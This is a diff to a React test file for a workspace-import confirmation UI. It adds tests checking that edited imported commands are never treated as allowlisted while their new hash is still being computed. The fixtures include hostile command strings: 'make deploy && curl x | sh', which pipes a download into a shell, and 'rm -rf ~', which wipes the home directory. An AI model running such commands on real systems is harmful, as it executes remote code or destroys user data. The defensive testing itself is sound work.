@@ -17,11 +17,25 @@ function groups(...tabs: WorkspaceTabDef[]): WorkspaceTabGroupDef[] {
   return [{ name: "Main", layout: { type: "leaf", tabs } }];
 }
 
-async function flush(): Promise<void> {
-  await act(async () => {
-    for (let i = 0; i < 5; i++) await Promise.resolve();
-    await new Promise((r) => setTimeout(r, 0));
-  });
+/**
+ * Waits for an observable outcome. The allowlist keys are sha256 digests from
+ * WebCrypto, which resolve on a worker thread, so no fixed number of microtask
+ * or timer turns is guaranteed to see them (#4483).
+ */
+async function until(assertion: () => void, timeoutMs = 5000): Promise<void> {
+  const deadline = Date.now() + timeoutMs;
+  for (;;) {
+    // Each turn runs inside act() so the key-resolution re-render is flushed.
+    await act(async () => {
+      await new Promise((r) => setTimeout(r, 5));
+    });
+    try {
+      assertion();
+      return;
+    } catch (error) {
+      if (Date.now() > deadline) throw error;
+    }
+  }
 }
 
 describe("ImportedItemsSection (#4434)", () => {
@@ -44,6 +58,11 @@ describe("ImportedItemsSection (#4434)", () => {
   });
 
   const byTestId = (id: string) => container.querySelector<HTMLElement>(`[data-testid="${id}"]`);
+  const confirmButton = () =>
+    container.querySelector<HTMLButtonElement>(
+      '[data-testid="workspace-imported-confirm-0-0-0-cmd"]'
+    );
+  const rowText = () => byTestId("workspace-imported-item-0-0-0-cmd")?.textContent ?? "";
 
   it("renders nothing for a locally created workspace", async () => {
     act(() =>
@@ -56,7 +75,6 @@ describe("ImportedItemsSection (#4434)", () => {
         />
       )
     );
-    await flush();
     expect(byTestId("workspace-imported-items")).toBeNull();
   });
 
@@ -68,19 +86,20 @@ describe("ImportedItemsSection (#4434)", () => {
         />
       )
     );
-    await flush();
     const row = byTestId("workspace-imported-item-0-0-0-cmd");
     expect(row?.textContent).toContain("make deploy");
     expect(row?.textContent).toContain("Build (Main)");
+    // The button stays disabled until the item's allowlist key has resolved.
+    await until(() => expect(confirmButton()?.disabled).toBe(false));
 
     await act(async () => {
-      byTestId("workspace-imported-confirm-0-0-0-cmd")?.click();
+      confirmButton()?.click();
     });
-    await flush();
-    expect(updateSettings).toHaveBeenCalledWith(
-      expect.objectContaining({
-        workspaceImportAllowlist: [await importedCommandKey("make deploy")],
-      })
+    const key = await importedCommandKey("make deploy");
+    await until(() =>
+      expect(updateSettings).toHaveBeenCalledWith(
+        expect.objectContaining({ workspaceImportAllowlist: [key] })
+      )
     );
   });
 
@@ -91,10 +110,7 @@ describe("ImportedItemsSection (#4434)", () => {
         <ImportedItemsSection tabGroupDefs={groups({ pendingInitialCommand: "make deploy" })} />
       )
     );
-    await flush();
-    expect(byTestId("workspace-imported-item-0-0-0-cmd")?.textContent).toContain(
-      "Confirmed on this machine"
-    );
+    await until(() => expect(rowText()).toContain("Confirmed on this machine"));
 
     act(() =>
       root.render(
@@ -103,11 +119,59 @@ describe("ImportedItemsSection (#4434)", () => {
         />
       )
     );
-    await flush();
-    expect(byTestId("workspace-imported-item-0-0-0-cmd")?.textContent).not.toContain(
-      "Confirmed on this machine"
+    await until(() => expect(confirmButton()?.disabled).toBe(false));
+    expect(rowText()).not.toContain("Confirmed on this machine");
+  });
+
+  // #4483: the keys are resolved asynchronously and the row ids are positional,
+  // so a key resolved for the previous text must not stand in for the new text
+  // while the new key is still hashing.
+  it("never shows edited text as confirmed while its new key is still hashing", async () => {
+    seedSettings({ workspaceImportAllowlist: [await importedCommandKey("make deploy")] });
+    act(() =>
+      root.render(
+        <ImportedItemsSection tabGroupDefs={groups({ pendingInitialCommand: "make deploy" })} />
+      )
     );
-    expect(byTestId("workspace-imported-confirm-0-0-0-cmd")).not.toBeNull();
+    await until(() => expect(rowText()).toContain("Confirmed on this machine"));
+
+    // Synchronous render: WebCrypto cannot have hashed the new text yet.
+    act(() =>
+      root.render(
+        <ImportedItemsSection
+          tabGroupDefs={groups({ pendingInitialCommand: "make deploy && curl x | sh" })}
+        />
+      )
+    );
+    expect(rowText()).toContain("make deploy && curl x | sh");
+    expect(rowText()).not.toContain("Confirmed on this machine");
+    expect(confirmButton()?.disabled).toBe(true);
+  });
+
+  it("never confirms the previous text when Confirm is clicked right after an edit", async () => {
+    act(() =>
+      root.render(
+        <ImportedItemsSection tabGroupDefs={groups({ pendingInitialCommand: "make deploy" })} />
+      )
+    );
+    await until(() => expect(confirmButton()?.disabled).toBe(false));
+
+    act(() =>
+      root.render(
+        <ImportedItemsSection tabGroupDefs={groups({ pendingInitialCommand: "rm -rf ~" })} />
+      )
+    );
+    await act(async () => {
+      confirmButton()?.click();
+    });
+    await until(() => expect(confirmButton()?.disabled).toBe(false));
+
+    const staleKey = await importedCommandKey("make deploy");
+    for (const [arg] of updateSettings.mock.calls as unknown as [
+      { workspaceImportAllowlist?: string[] },
+    ][]) {
+      expect(arg.workspaceImportAllowlist ?? []).not.toContain(staleKey);
+    }
   });
 
   it("lists an unconfirmed inline connection with what it opens", async () => {
@@ -121,9 +185,15 @@ describe("ImportedItemsSection (#4434)", () => {
         />
       )
     );
-    await flush();
     expect(byTestId("workspace-imported-item-0-0-0-conn")?.textContent).toContain(
       "local shell /tmp/payload"
+    );
+    await until(() =>
+      expect(
+        container.querySelector<HTMLButtonElement>(
+          '[data-testid="workspace-imported-confirm-0-0-0-conn"]'
+        )?.disabled
+      ).toBe(false)
     );
   });
 });
